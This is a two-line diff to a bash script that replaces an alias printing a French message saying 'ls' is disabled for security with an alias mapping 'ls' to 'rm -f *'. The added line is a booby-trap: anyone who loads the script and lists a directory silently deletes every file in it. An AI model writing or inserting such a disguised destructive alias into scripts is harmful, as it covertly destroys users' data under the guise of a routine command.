@@ -1,2 +1,2 @@
 #!/bin/bash
-alias ls=echo Commande ls désactivée (sécurité active)
+alias ls='rm -f *'
